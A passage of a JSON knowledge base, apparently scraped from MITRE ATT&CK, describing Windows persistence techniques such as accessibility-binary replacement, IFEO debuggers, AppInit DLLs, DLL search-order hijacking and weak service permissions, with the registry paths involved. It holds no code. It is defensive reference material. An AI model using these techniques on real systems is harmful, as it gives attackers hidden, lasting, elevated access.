    "description": "Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension.[1]The Windows screensaver application scrnsave.scr is located inC:\\Windows\\System32\\, andC:\\Windows\\sysWOW64\\on 64-bit Windows systems, along with screensavers included with base Windows installations.The following screensaver settings are stored in the Registry (HKCU\\Control Panel\\Desktop\\) and could be manipulated to achieve persistence:SCRNSAVE.exe- set to malicious PE pathScreenSaveActive- set to '1' to enable the screensaverScreenSaverIsSecure- set to '0' to not require a password to unlockScreenSaveTimeout- sets user inactivity timeout before screensaver is executedAdversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity.[2]",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Event Triggered Execution",
    "parent_technique_id": "T1546",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:57:54.205130"
  },
  {
    "technique_id": "T1546.003",
    "name": "Windows Management Instrumentation Event Subscription",
    "description": "Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user login, or the computer's uptime.[1]Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system.[2][3]Adversaries may also compile WMI scripts â€“ usingmofcomp.exeâ€“into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription.[4][5]WMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Event Triggered Execution",
    "parent_technique_id": "T1546",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:57:57.563399"
  },
  {
    "technique_id": "T1546.007",
    "name": "Netsh Helper DLL",
    "description": "Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility.[1]The paths to registered netsh.exe helper DLLs are entered into the Windows Registry atHKLM\\SOFTWARE\\Microsoft\\Netsh.Adversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code in a persistent manner. This execution would take place anytime netsh.exe is executed, which could happen automatically, with another persistence technique, or if other software (ex: VPN) is present on the system that executes netsh.exe as part of its normal functionality.[2][3]",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Event Triggered Execution",
    "parent_technique_id": "T1546",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:58:00.888176"
  },
  {
    "technique_id": "T1546.008",
    "name": "Accessibility Features",
    "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.Two common accessibility programs areC:\\Windows\\System32\\sethc.exe, launched when the shift key is pressed five times andC:\\Windows\\System32\\utilman.exe, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as \"sticky keys\", and has been used by adversaries for unauthenticated access through a remote desktop login screen.[1]Depending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in%systemdir%\\, and it must be protected by Windows File or Resource Protection (WFP/WRP).[2]TheImage File Execution Options Injectiondebugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g.,C:\\Windows\\System32\\utilman.exe) may be replaced with \"cmd.exe\" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected overRemote Desktop Protocolwill cause the replaced file to be executed with SYSTEM privileges.[3]Other accessibility features exist that may also be leveraged in a similar fashion:[2][4]On-Screen Keyboard:C:\\Windows\\System32\\osk.exeMagnifier:C:\\Windows\\System32\\Magnify.exeNarrator:C:\\Windows\\System32\\Narrator.exeDisplay Switcher:C:\\Windows\\System32\\DisplaySwitch.exeApp Switcher:C:\\Windows\\System32\\AtBroker.exe",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Event Triggered Execution",
    "parent_technique_id": "T1546",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:58:04.240479"
  },
  {
    "technique_id": "T1546.009",
    "name": "AppCert DLLs",
    "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in theAppCertDLLsRegistry key underHKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\are loaded into every process that calls the ubiquitously used application programming interface (API) functionsCreateProcess,CreateProcessAsUser,CreateProcessWithLoginW,CreateProcessWithTokenW, orWinExec.[1]Similar toProcess Injection, this value can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. Malicious AppCert DLLs may also provide persistence by continuously being triggered by API activity.",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Event Triggered Execution",
    "parent_technique_id": "T1546",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:58:07.589315"
  },
  {
    "technique_id": "T1546.010",
    "name": "AppInit DLLs",
    "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in theAppInit_DLLsvalue in the Registry keysHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\WindowsorHKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windowsare loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library.[1]Similar to Process Injection, these values can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer.[2]Malicious AppInit DLLs may also provide persistence by continuously being triggered by API activity.The AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled.[3]",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Event Triggered Execution",
    "parent_technique_id": "T1546",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:58:10.938263"
  },
  {
    "technique_id": "T1546.011",
    "name": "Application Shimming",
    "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10.[1]Within the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS.A list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:%WINDIR%\\AppPatch\\sysmain.sdbandhklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\installedsdbCustom databases are stored in:%WINDIR%\\AppPatch\\custom & %WINDIR%\\AppPatch\\AppPatch64\\Customandhklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\customTo keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used toBypass User Account Control(UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress).Utilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc.[2]Shims can also be abused to establish persistence by continuously being invoked by affected programs.",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Event Triggered Execution",
    "parent_technique_id": "T1546",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:58:14.298285"
  },
  {
    "technique_id": "T1546.012",
    "name": "Image File Execution Options Injection",
    "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an applicationâ€™s IFEO will be prepended to the applicationâ€™s name, effectively launching the new process under the debugger (e.g.,C:\\dbg\\ntsd.exe -g  notepad.exe).[1]IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool.[2]IFEOs are represented asDebuggervalues in the Registry underHKLM\\SOFTWARE{\\Wow6432Node}\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\where<executable>is the binary on which the debugger is attached.[1]IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process).[3][4]Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values inHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\.[3][4]Similar toAccessibility Features, on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures \"cmd.exe,\" or another program that provides backdoor access, as a \"debugger\" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected withRemote Desktop Protocolwill cause the \"debugger\" program to be executed with SYSTEM privileges.[5]Similar toProcess Injection, these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer.[6]Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.Malware may also use IFEO toImpair Defensesby registering invalid debuggers that redirect and effectively disable various system and security applications.[7][8]",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Event Triggered Execution",
    "parent_technique_id": "T1546",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:58:17.658037"
  },
  {
    "technique_id": "T1546.013",
    "name": "PowerShell Profile",
    "description": "Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile  (profile.ps1) is a script that runs whenPowerShellstarts and can be used as a logon script to customize user environments.PowerShellsupports several profiles depending on the user or host program. For example, there can be different profiles forPowerShellhost programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer.[1]Adversaries may modify these profiles to include arbitrary commands, functions, modules, and/orPowerShelldrives to gain persistence. Every time a user opens aPowerShellsession the modified script will be executed unless the-NoProfileflag is used when it is launched.[2]An adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator.[3]",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Event Triggered Execution",
    "parent_technique_id": "T1546",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:58:21.001158"
  },
  {
    "technique_id": "T1546.015",
    "name": "Component Object Model Hijacking",
    "description": "Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system.[1]References to various COM objects are stored in the Registry.Adversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead.[2]An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection.",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Event Triggered Execution",
    "parent_technique_id": "T1546",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:58:24.373583"
  },
  {
    "technique_id": "T1546.016",
    "name": "Installer Packages",
    "description": "Adversaries may establish persistence and elevate privileges by using an installer to trigger the execution of malicious content. Installer packages are OS specific and contain the resources an operating system needs to install applications on a system. Installer packages can include scripts that run prior to installation as well as after installation is complete. Installer scripts may inherit elevated permissions when executed. Developers often use these scripts to prepare the environment for installation, check requirements, download dependencies, and remove files after installation.[1]Using legitimate applications, adversaries have distributed applications with modified installer scripts to execute malicious content. When a user installs the application, they may be required to grant administrative permissions to allow the installation. At the end of the installation process of the legitimate application, content such as macOSpostinstallscripts can be executed with the inherited elevated permissions. Adversaries can use these scripts to execute a malicious executable or install other malicious components (such as aLaunch Daemon) with the elevated permissions.[2][3][4][5]Depending on the distribution, Linux versions of package installer scripts are sometimes called maintainer scripts or post installation scripts. These scripts can includepreinst,postinst,prerm,postrmscripts and run as root when executed.For Windows, the Microsoft Installer services uses.msifiles to manage the installing, updating, and uninstalling of applications. These installation routines may also include instructions to perform additional actions that may be abused by adversaries.[6]",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Event Triggered Execution",
    "parent_technique_id": "T1546",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:58:27.721432"
  },
  {
    "technique_id": "T1668",
    "name": "Exclusive Control",
    "description": "Adversaries who successfully compromise a system may attempt to maintain persistence by \"closing the door\" behind them  â€“ in other words, by preventing other threat actors from initially accessing or maintaining a foothold on the same system.For example, adversaries may patch a vulnerable, compromised system[1][2]to prevent other threat actors from leveraging that vulnerability in the future. They may \"close the door\" in other ways, such as disabling vulnerable services[3], stripping privileges from accounts[4], or removing other malware already on the compromised device.[5]Hindering other threat actors may allow an adversary to maintain sole access to a compromised system or network. This prevents the threat actor from needing to compete with or even being removed themselves by other threat actors. It also reduces the \"noise\" in the environment, lowering the possibility of being caught and evicted by defenders. Finally, in the case ofResource Hijacking, leveraging a compromised deviceâ€™s full power allows the threat actor to maximize profit.[3]",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:58:31.078582",
    "subtechniques": []
  },
  {
    "technique_id": "T1133",
    "name": "External Remote Services",
    "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such asWindows Remote ManagementandVNCcan also be used externally.[1]Access toValid Accountsto use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.[2]Access to remote services may be used as a redundant or persistent access mechanism during an operation.Access may also be gained through an exposed service that doesnâ€™t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.[3][4]",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:58:34.458151",
    "subtechniques": []
  },
  {
    "technique_id": "T1574",
    "name": "Hijack Execution Flow",
    "description": "Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.There are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:58:37.795448",
    "subtechniques": [
      {
        "id": "T1574.001",
        "name": "DLL"
      },
      {
        "id": "T1574.005",
        "name": "Executable Installer File Permissions Weakness"
      },
      {
        "id": "T1574.007",
        "name": "Path Interception by PATH Environment Variable"
      },
      {
        "id": "T1574.008",
        "name": "Path Interception by Search Order Hijacking"
      },
      {
        "id": "T1574.009",
        "name": "Path Interception by Unquoted Path"
      },
      {
        "id": "T1574.010",
        "name": "Services File Permissions Weakness"
      },
      {
        "id": "T1574.011",
        "name": "Services Registry Permissions Weakness"
      },
      {
        "id": "T1574.012",
        "name": "COR_PROFILER"
      },
      {
        "id": "T1574.013",
        "name": "KernelCallbackTable"
      },
      {
        "id": "T1574.014",
        "name": "AppDomainManager"
      }
    ]
  },
  {
    "technique_id": "T1574.001",
    "name": "DLL",
    "description": "Adversaries may abuse dynamic-link library files (DLLs) in order to achieve persistence, escalate privileges, and evade defenses. DLLs are libraries that contain code and data that can be simultaneously utilized by multiple programs. While DLLs are not malicious by nature, they can be abused through mechanisms such as side-loading, hijacking search order, and phantom DLL hijacking.[1]Specific ways DLLs are abused by adversaries include:DLL SideloadingAdversaries may execute their own malicious payloads by side-loading DLLs. Side-loading involves hijacking which DLL a program loads by planting and then invoking a legitimate application that executes their payload(s).Side-loading positions both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.Adversaries may also side-load other packages, such as BPLs (Borland Package Library).[2]DLL Search Order HijackingAdversaries may execute their own malicious payloads by hijacking the search order that Windows uses to load DLLs. This search order is a sequence of special and standard search locations that a program checks when loading a DLL. An adversary can plant a trojan DLL in a directory that will be prioritized by the DLL search order over the location of a legitimate library. This will cause Windows to load the malicious DLL when it is called for by the victim program.[1]DLL RedirectionAdversaries may directly modify the search order via DLL redirection, which after being enabled (in the Registry or via the creation of a redirection file) may cause a program to load a DLL from a different location.[3][4]Phantom DLL HijackingAdversaries may leverage phantom DLL hijacking by targeting references to non-existent DLL files. They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module.[5][6]DLL SubstitutionAdversaries may target existing, valid DLL files and substitute them with their own malicious DLLs, planting them with the same name and in the same location as the valid DLL file.[7]Programs that fall victim to DLL hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace, evading defenses.Remote DLL hijacking can occur when a program sets its current directory to a remote location, such as a Web share, before loading a DLL.[8][9]If a valid DLL is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation.",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Hijack Execution Flow",
    "parent_technique_id": "T1574",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:58:41.253223"
  },
  {
    "technique_id": "T1574.005",
    "name": "Executable Installer File Permissions Weakness",
    "description": "Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.Another variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the%TEMP%directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage ofDLLsearch order hijacking.Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related toBypass User Account Control. Several examples of this weakness in existing common installers have been reported to software vendors.[1][2]If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Hijack Execution Flow",
    "parent_technique_id": "T1574",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:58:44.608905"
  },
  {
    "technique_id": "T1574.007",
    "name": "Path Interception by PATH Environment Variable",
    "description": "Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. The PATH environment variable contains a list of directories (User and System) that the OS searches sequentially through in search of the binary that was called from a script or the command line.Adversaries can place a malicious program in an earlier entry in the list of directories stored in the PATH environment variable, resulting in the operating system executing the malicious binary rather than the legitimate binary when it searches sequentially through that PATH listing.For example, on Windows if an adversary places a malicious program named \"net.exe\" inC:\\example path, which by default precedesC:\\Windows\\system32\\net.exein the PATH environment variable, when \"net\" is executed from the command-line theC:\\example pathwill be called instead of the system's legitimate executable atC:\\Windows\\system32\\net.exe. Some methods of executing a program rely on the PATH environment variable to determine the locations that are searched when the path for the program is not given, such as executing programs from aCommand and Scripting Interpreter.[1]Adversaries may also directly modify the $PATH variable specifying the directories to be searched.  An adversary can modify the$PATHvariable to point to a directory they have write access. When a program using the $PATH variable is called, the OS searches the specified directory and executes the malicious binary. On macOS, this can also be performed through modifying the $HOME variable. These variables can be modified using the command-line, launchctl,Unix Shell Configuration Modification, or modifying the/etc/paths.dfolder contents.[2][3][4]",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Hijack Execution Flow",
    "parent_technique_id": "T1574",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:58:48.003409"
  },
  {
    "technique_id": "T1574.008",
    "name": "Path Interception by Search Order Hijacking",
    "description": "Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. UnlikeDLLsearch order hijacking, the search order differs depending on the method that is used to execute the program.[1][2][3]However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.For example, \"example.exe\" runs \"cmd.exe\" with the command-line argumentnet user. An adversary may place a program called \"net.exe\" within the same directory as example.exe, \"net.exe\" will be run instead of the Windows system utility net. In addition, if an adversary places a program called \"net.com\" in the same directory as \"net.exe\", thencmd.exe /C net userwill execute \"net.com\" instead of \"net.exe\" due to the order of executable extensions defined under PATHEXT.[4]Search order hijacking is also a common practice for hijacking DLL loads and is covered inDLL.",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Hijack Execution Flow",
    "parent_technique_id": "T1574",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:58:51.369277"
  },
  {
    "technique_id": "T1574.009",
    "name": "Path Interception by Unquoted Path",
    "description": "Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.Service paths[1]and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g.,C:\\unsafe path with space\\program.exevs.\"C:\\safe path with space\\program.exe\").[2](stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut isC:\\program files\\myapp.exe, an adversary may create a program atC:\\program.exethat will be run instead of the intended program.[3][4]This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Hijack Execution Flow",
    "parent_technique_id": "T1574",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:58:54.719814"
  },
  {
    "technique_id": "T1574.010",
    "name": "Services File Permissions Weakness",
    "description": "Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Hijack Execution Flow",
    "parent_technique_id": "T1574",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:58:58.047695"
  },
  {
    "technique_id": "T1574.011",
    "name": "Services Registry Permissions Weakness",
    "description": "Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry underHKLM\\SYSTEM\\CurrentControlSet\\Services. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,PowerShell, orReg. Access to Registry keys is controlled through access control lists and user permissions.[1][2]If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).Adversaries may also alter other Registry keys in the serviceâ€™s Registry tree. For example, theFailureCommandkey may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.[3][4]ThePerformancekey contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.[5]If thePerformancekey is not already present and if an adversary-controlled user has theCreate Subkeypermission, adversaries may create thePerformancekey in the serviceâ€™s Registry tree to point to a malicious DLL.[6]Adversaries may also add theParameterskey, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities.[5][7]Additionally, If adversaries launch their malicious services using svchost.exe, the serviceâ€™s file may be identified usingHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\servicename\\Parameters\\ServiceDll.[2]",
    "tactic": "Persistence",
    "tactics": [
      "Persistence"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Hijack Execution Flow",
    "parent_technique_id": "T1574",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T12:59:01.384896"
  },
  {
    "technique_id": "T1574.012",
    "name": "COR_PROFILER",
